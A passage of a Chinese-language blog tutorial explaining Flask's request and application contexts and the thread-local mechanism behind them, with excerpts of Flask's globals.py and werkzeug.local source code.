        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-19/1603113809608-10318.png" alt="10318"></p><h2 id="上下文"><a href="#上下文" class="headerlink" title="上下文"></a>上下文</h2><blockquote><p>在<code>Flask0.9</code> 之前,<code>Flask</code> 只有请求上下文<code>request context</code> 的概念.</p><p>在写<code>Flask</code> 程序时,可以直接调用<code>request,session,g</code> 等变量.比如:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>requestapp<span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'This is {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这些变量看起来像全局变量,因为可以直接调用并返回值.但实际上这些变量并不是真正意义的全局变量.比如在多线程服务器中,多个线程同时处理不同的客户端发送的不同请求时,每个线程看到的<code>request</code>对象必然是不同的.</p><pre class="mermaid">> graph TBA(client1)B(client2)C(client3)D(web)E(Thead_1)E2(Thead_2)E3(Thead_3)A-.request_1.->EB-.request_2.->E2C-.request_3.->E3E-->DE2-->DE3-->D</pre><p>如果不设置全局变量,那么在编写代码时必须手动传递<code>request</code>变量到视图函数中.这就导致了每个视图函数中必须增加一个参数.除了访问请求对象,如果视图函数还需要处理<code>session</code> ,那就又需要传递一个参数,这样情况会变得很复杂.</p><p>为了避免大量可有可无的参数把视图函数弄的复杂,<code>Flask</code> 使用上下文来临时把某些对象变为全局可访问.</p><ul><li>在这里<code>Flask</code> 在设计时采取了线程隔离的思路,也就是说在一次请求的一个线程中可以将<code>request</code> 变成全局变量,但是仅限于请求的这个线程内部,不同线程使用线程标识符来区别,这样就不会影响其他线程的请求.<code>Flask</code> 实现线程隔离主要用到了<code>werkzeug</code> 中的两个类:<code>Local和LocalProxy</code></li></ul><pre class="mermaid">> graph TBA(client1)B(client2)C(client3)D(web)E(Thead_1)E2(Thead_2)E3(Thead_3)A-.request是Thread_1的全局变量.->EB-.request是Thread_2的全局变量.->E2C-.request是Thread_3的全局变量.->E3E-->DE2-->DE3-->D</pre><ul><li>实现了线程隔离后,为了在一个线程中更方便的处理这些变量,<code>Flask</code> 通过<code>werkzeug.LocalStack</code>实现了了一个堆栈结构.它的作用是用来存储一个环境,比如,某个线程得到一个请求,那么和这个请求的所有相关信息都会打包,打包形成的就是处理请求的一个环境.<code>Flask</code> 将这种环境称为请求上下文<code>request context</code>,之后<code>Flask</code> 会把这个<code>request context</code> 放置到堆栈结构中.一切完成后,就可以通过这个<code>request context</code> 获取相关对象并直接访问,比如<code>current_app,request,session,g</code> .还可以通过调用对象的方法或者属性来获取其他信息,比如<code>request.method</code> ,当请求结束后,请求上下文会被删除,堆栈结构重新等待新的请求上下文对象被<code>push</code> .</li></ul><p>对于单一应用来说<code>request context</code> 就可以了,但是<code>Flask</code> 是支持多<code>app</code> 实例的.当一个应用的请求上下文环境中,需要嵌套处理另一个引用的相关操作时(这种情况更多的用于测试或者脚本易用<code>flask_script</code> 等等),请求上下文就不能很好的处理问题了,因为<code>current_app</code> 无法确定当前处理的是哪个应用,也就无从谈起<code>request context</code> 了,为了解决这个问题,<code>Flask</code> 把与应用相关的信息单独保存下来,形成了;一个<code>application context</code> 应用上下文对象.</p><p><code>application context</code> 和<code>request context</code> 类似,它可以单独使用,也可以结合<code>request context</code> 一起使用.<code>Flask</code> 在处理请求时会自动推送应用程序上下文.</p></blockquote><h3 id="1-什么是上下文"><a href="#1-什么是上下文" class="headerlink" title="1.什么是上下文"></a>1.什么是上下文</h3><blockquote><p>类似于中文的结合上下文理解,上下文指示了一个环境,语境,语义.在程序中代码执行到某一时刻时,根据之前代码所做的操作以及下文将要执行的逻辑,可以决定当前时刻下可以使用的变量,或者要完成的事情.</p><p>比如:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>requestapp<span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'This is {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>函数<code>index()</code>访问了<code>request</code> 这个外部变量.假设<code>request</code> 并不是全局变量,就需要去构造<code>request</code> 的值,否则程序无法运行.类似</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> c <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">>></span><span class="token operator">></span> foo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">foo1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">return</span> a<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">>></span><span class="token operator">></span> foo1<span class="token punctuation">(</span><span class="token punctuation">)</span>Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>File <span class="token string">"&lt;input>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>foo1<span class="token punctuation">(</span><span class="token punctuation">)</span>File <span class="token string">"&lt;input>"</span><span class="token punctuation">,</span> line <span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">in</span> foo1<span class="token keyword">return</span> aNameError<span class="token punctuation">:</span> name <span class="token string">'a'</span> <span class="token keyword">is</span> <span class="token operator">not</span> defined<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是<code>Flask</code> 实现了请求上下文,这里的<code>request</code> 就是一个全局变量,它是根据当前的环境生成 的.那么这个环境就可以称之为上下文.</p><p>结合上面的介绍可以知道,<code>Flask</code> 实现了2种上下文,即请求上下文(<code>request context</code>)和应用上下文(<code>application context</code>).<code>Flask</code> 中的上下文相当于一个容器,它保存了<code>Flask</code> 运行过程中的一些信息.</p><ul><li><code>application</code> 指的是<code>app=Flask(__name__)</code> 创建的<code>app</code>对象.</li><li><code>request</code> 指的是每次的<code>http</code> 请求发生时,<code>WSGIServer</code>调用<code>Flask.__call__()</code>之后,在内部创建的<code>Response</code> 对象.</li><li><code>application</code> 的生命周期大于<code>request</code>,一个<code>application</code> 存活期间,可以发出多次<code>http request</code> ,会产生多个<code>request</code>.</li></ul></blockquote><h3 id="2-请求上下文"><a href="#2-请求上下文" class="headerlink" title="2.请求上下文"></a>2.请求上下文</h3><blockquote><p>像上面的<code>request</code> ,它的表现就像一个全局变量一样可以使用,但是它又不是一个真正的全局变量,因为一个多线程服务器中,不可能每个<code>Thread</code>的<code>request</code> 都一样,那么如何让<code>request</code>的行为像全局变量一样呢?既然和<code>Thread</code> 线程相关,那么它的表现就应该是对于每个<code>Thread</code> ,<code>request</code> 对象是它的全局变量.</p><pre class="mermaid">> graph TBA(client1)B(client2)C(client3)D(web)E(Thead_1)E2(Thead_2)E3(Thead_3)A-.request是Thread_1的全局变量.->EB-.request是Thread_2的全局变量.->E2C-.request是Thread_3的全局变量.->E3E-->DE2-->DE3-->D</pre><p>在<code>Python</code> 的多线程模块中,有一个类似的概念<code>threading.local</code> ,它可以实现多线程中每个线程只使用自己的局部变量,而不影响其他线程,类似与:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token comment" spellcheck="true"># 创建一个全局的Local对象,它存储的是一个字典对象</span>local <span class="token operator">=</span> threading<span class="token punctuation">.</span>local<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建一个函数</span><span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token punctuation">:</span>local<span class="token punctuation">.</span>tname <span class="token operator">=</span> var<span class="token keyword">print</span><span class="token punctuation">(</span>local<span class="token punctuation">.</span>tname<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>func<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'test1'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>t2 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>func<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'test2'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>t1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>t2<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行后:</p><pre class="line-numbers language-bash"><code class="language-bash">❯ python 线程访问局部变量.pytest1test2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>虽然<code>local</code> 是一个全局对象,但是由于是一个<code>threading.local()</code> 对象.所以每个子线程访问得到的局部变量是不同的.<code>threading.local()</code>内部保存是一个<a href="https://docs.python.org/zh-cn/3/library/threading.html?highlight=threading#thread-local-data" target="_blank" rel="noopener">字典对象</a>.实现了线程和值的对相应类似于</p><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token string">'thread_1'</span><span class="token punctuation">:</span><span class="token punctuation">{</span>  <span class="token string">'tname'</span><span class="token punctuation">:</span><span class="token string">'test1'</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">'thread_2'</span><span class="token punctuation">:</span><span class="token punctuation">{</span>        <span class="token string">'tname'</span><span class="token punctuation">:</span><span class="token string">'test2'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>Flask</code> 中也实现了类似的对应.它依赖与<code>werkzeug.Local</code> .</p><hr><p>这里先来看下<code>Flask</code> 中的<code>request context</code> 的定义,它被写入到了<code>globals.py</code> 文件中:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> functools <span class="token keyword">import</span> partial<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>local <span class="token keyword">import</span> LocalProxy<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>local <span class="token keyword">import</span> LocalStack_request_ctx_err_msg<span class="token operator">=</span><span class="token string">'...'</span>_app_ctx_err_msg<span class="token operator">=</span><span class="token string">'...'</span><span class="token keyword">def</span> <span class="token function">_lookup_req_object</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>top <span class="token operator">=</span> _request_ctx_stack<span class="token punctuation">.</span>top<span class="token keyword">if</span> top <span class="token keyword">is</span> None<span class="token punctuation">:</span>  <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span>_request_ctx_err_msg<span class="token punctuation">)</span><span class="token keyword">return</span> getattr<span class="token punctuation">(</span>top<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">_lookup_app_object</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>top <span class="token operator">=</span> _app_ctx_stack<span class="token punctuation">.</span>top<span class="token keyword">if</span> top <span class="token keyword">is</span> None<span class="token punctuation">:</span>  <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span>_app_ctx_err_msg<span class="token punctuation">)</span><span class="token keyword">return</span> getattr<span class="token punctuation">(</span>top<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">_find_app</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>top <span class="token operator">=</span> _app_ctx_stack<span class="token punctuation">.</span>top<span class="token keyword">if</span> top <span class="token keyword">is</span> None<span class="token punctuation">:</span>  <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span>_app_ctx_err_msg<span class="token punctuation">)</span><span class="token keyword">return</span> top<span class="token punctuation">.</span>app<span class="token comment" spellcheck="true"># context locals</span>_request_ctx_stack <span class="token operator">=</span> LocalStack<span class="token punctuation">(</span><span class="token punctuation">)</span>_app_ctx_stack <span class="token operator">=</span> LocalStack<span class="token punctuation">(</span><span class="token punctuation">)</span>current_app <span class="token operator">=</span> LocalProxy<span class="token punctuation">(</span>_find_app<span class="token punctuation">)</span>request <span class="token operator">=</span> LocalProxy<span class="token punctuation">(</span>partial<span class="token punctuation">(</span>_lookup_req_object<span class="token punctuation">,</span> <span class="token string">"request"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>session <span class="token operator">=</span> LocalProxy<span class="token punctuation">(</span>partial<span class="token punctuation">(</span>_lookup_req_object<span class="token punctuation">,</span> <span class="token string">"session"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>g <span class="token operator">=</span> LocalProxy<span class="token punctuation">(</span>partial<span class="token punctuation">(</span>_lookup_app_object<span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Flask</code> 中提供的2种上下文:<code>application context</code> 和<code>request context</code> ,在这里分别演化如下:</p><ul><li><code>application context</code><ul><li><code>current app</code></li><li><code>g</code></li></ul></li><li><code>request context</code><ul><li><code>request</code></li><li><code>session</code></li></ul></li></ul><p>他们的实现依赖于<code>LocalProxy()</code>,为了更好的使用内部变量,由生成了2个堆栈结构<code>_request_ctx_stack</code>和<code>_app_ctx_stack</code> ,它依赖与<code>LocalStack()</code>,根据导入可以知道他们均来自于<code>werkzeug.local</code></p></blockquote><h4 id="1-werkzeug-local"><a href="#1-werkzeug-local" class="headerlink" title="1.werkzeug.local"></a>1.<code>werkzeug.local</code></h4><blockquote><p><a href="https://werkzeug.palletsprojects.com/en/0.16.x/local/?highlight=local#module-werkzeug.local" target="_blank" rel="noopener">官网介绍</a></p><p>文档中直接写出了为什么要实现一个<code>local</code> 模块</p><pre class="line-numbers language-markdown"><code class="language-markdown">The Python standard library has a concept called “thread locals” (or thread-local data). A thread local is a global object in which you can put stuff in and get back later in a thread-safe and thread-specific way. That means that whenever you set or get a value on a thread local object, the thread local object checks in which thread you are and retrieves the value corresponding to your thread (if one exists). So, you won’t accidentally get another thread’s data.This approach, however, has a few disadvantages. For example, besides threads, there are other types of concurrency in Python. A very popular one is greenlets. Also, whether every request gets its own thread is not guaranteed in WSGI. It could be that a request is reusing a thread from a previous request, and hence data is left over in the thread local object.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>以上文档解释了<code>并发</code> 的问题,多线程并不是唯一的方式,在<code>Python</code> 中还有<code>greenlet</code>协程.协程的特点就是一个线程执行,一个线程中可以存在多个协程,可以理解为:协程复用线程.对于<code>WSGI</code> 应用来说,如果每一个线程处理一个请求,那么<code>threading.local</code> 可以解决单线程访问局部变量,但是每一个协程去处理一个请求时,一个线程中就存在多个协程,<code>threading.local</code> 会造成多个请求之间数据的相互干扰.为了解决这个问题,<code>werkzeug</code> 实现了一个<code>local</code>模块.它包含了4个类:</p><ul><li><code>Local</code>:存储线程或协程的私有变量</li><li><code>LocalStack</code>:堆栈数据结构</li><li><code>LocalProxy</code>:负责把所有对自己的操作转发给内部的 <code>Local</code> 对象</li><li><code>LocalManager</code></li></ul><p>源码文档:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># werkzeug.local</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">from</span> greenlet <span class="token keyword">import</span> getcurrent <span class="token keyword">as</span> get_ident<span class="token keyword">except</span> ImportError<span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">from</span> thread <span class="token keyword">import</span> get_ident    <span class="token keyword">except</span> ImportError<span class="token punctuation">:</span>        <span class="token keyword">from</span> _thread <span class="token keyword">import</span> get_ident  <span class="token keyword">def</span> <span class="token function">release_local</span><span class="token punctuation">(</span>local<span class="token punctuation">)</span><span class="token punctuation">:</span>    local<span class="token punctuation">.</span>__release_local__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Local</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    __slots__ <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"__storage__"</span><span class="token punctuation">,</span> <span class="token string">"__ident_func__"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        object<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"__storage__"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        object<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"__ident_func__"</span><span class="token punctuation">,</span> get_ident<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__iter__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> iter<span class="token punctuation">(</span>self<span class="token punctuation">.</span>__storage__<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__call__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> proxy<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Create a proxy for a name."""</span>        <span class="token keyword">return</span> LocalProxy<span class="token punctuation">(</span>self<span class="token punctuation">,</span> proxy<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__release_local__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>__storage__<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>self<span class="token punctuation">.</span>__ident_func__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__getattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>__storage__<span class="token punctuation">[</span>self<span class="token punctuation">.</span>__ident_func__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span>name<span class="token punctuation">]</span>        <span class="token keyword">except</span> KeyError<span class="token punctuation">:</span>            <span class="token keyword">raise</span> AttributeError<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__setattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        ident <span class="token operator">=</span> self<span class="token punctuation">.</span>__ident_func__<span class="token punctuation">(</span><span class="token punctuation">)</span>        storage <span class="token operator">=</span> self<span class="token punctuation">.</span>__storage__        <span class="token keyword">try</span><span class="token punctuation">:</span>            storage<span class="token punctuation">[</span>ident<span class="token punctuation">]</span><span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> value        <span class="token keyword">except</span> KeyError<span class="token punctuation">:</span>            storage<span class="token punctuation">[</span>ident<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>name<span class="token punctuation">:</span> value<span class="token punctuation">}</span>    <span class="token keyword">def</span> <span class="token function">__delattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">del</span> self<span class="token punctuation">.</span>__storage__<span class="token punctuation">[</span>self<span class="token punctuation">.</span>__ident_func__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span>name<span class="token punctuation">]</span>        <span class="token keyword">except</span> KeyError<span class="token punctuation">:</span>            <span class="token keyword">raise</span> AttributeError<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">LocalStack</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>_local <span class="token operator">=</span> Local<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__release_local__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__release_local__<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_get__ident_func__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__ident_func__    <span class="token keyword">def</span> <span class="token function">_set__ident_func__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        object<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_local<span class="token punctuation">,</span> <span class="token string">"__ident_func__"</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>    __ident_func__ <span class="token operator">=</span> property<span class="token punctuation">(</span>_get__ident_func__<span class="token punctuation">,</span> _set__ident_func__<span class="token punctuation">)</span>    <span class="token keyword">del</span> _get__ident_func__<span class="token punctuation">,</span> _set__ident_func__    <span class="token keyword">def</span> <span class="token function">__call__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">_lookup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> self<span class="token punctuation">.</span>top            <span class="token keyword">if</span> rv <span class="token keyword">is</span> None<span class="token punctuation">:</span>                <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"object unbound"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> rv        <span class="token keyword">return</span> LocalProxy<span class="token punctuation">(</span>_lookup<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">push</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Pushes a new item to the stack"""</span>        rv <span class="token operator">=</span> getattr<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_local<span class="token punctuation">,</span> <span class="token string">"stack"</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span>        <span class="token keyword">if</span> rv <span class="token keyword">is</span> None<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>stack <span class="token operator">=</span> rv <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        rv<span class="token punctuation">.</span>append<span class="token punctuation">(</span>obj<span class="token punctuation">)</span>        <span class="token keyword">return</span> rv    <span class="token keyword">def</span> <span class="token function">pop</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Removes the topmost item from the stack, will return the        old value or `None` if the stack was already empty.        """</span>        stack <span class="token operator">=</span> getattr<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_local<span class="token punctuation">,</span> <span class="token string">"stack"</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span>        <span class="token keyword">if</span> stack <span class="token keyword">is</span> None<span class="token punctuation">:</span>            <span class="token keyword">return</span> None        <span class="token keyword">elif</span> len<span class="token punctuation">(</span>stack<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            release_local<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_local<span class="token punctuation">)</span>            <span class="token keyword">return</span> stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    @property    <span class="token keyword">def</span> <span class="token function">top</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""The topmost item on the stack.  If the stack is empty,        `None` is returned.        """</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>AttributeError<span class="token punctuation">,</span> IndexError<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> None<span class="token keyword">class</span> <span class="token class-name">LocalManager</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> locals<span class="token operator">=</span>None<span class="token punctuation">,</span> ident_func<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> locals <span class="token keyword">is</span> None<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>locals <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">elif</span> isinstance<span class="token punctuation">(</span>locals<span class="token punctuation">,</span> Local<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>locals <span class="token operator">=</span> <span class="token punctuation">[</span>locals<span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>locals <span class="token operator">=</span> list<span class="token punctuation">(</span>locals<span class="token punctuation">)</span>        <span class="token keyword">if</span> ident_func <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>ident_func <span class="token operator">=</span> ident_func            <span class="token keyword">for</span> local <span class="token keyword">in</span> self<span class="token punctuation">.</span>locals<span class="token punctuation">:</span>                object<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span>local<span class="token punctuation">,</span> <span class="token string">"__ident_func__"</span><span class="token punctuation">,</span> ident_func<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>ident_func <span class="token operator">=</span> get_ident    <span class="token keyword">def</span> <span class="token function">get_ident</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>ident_func<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">cleanup</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Manually clean up 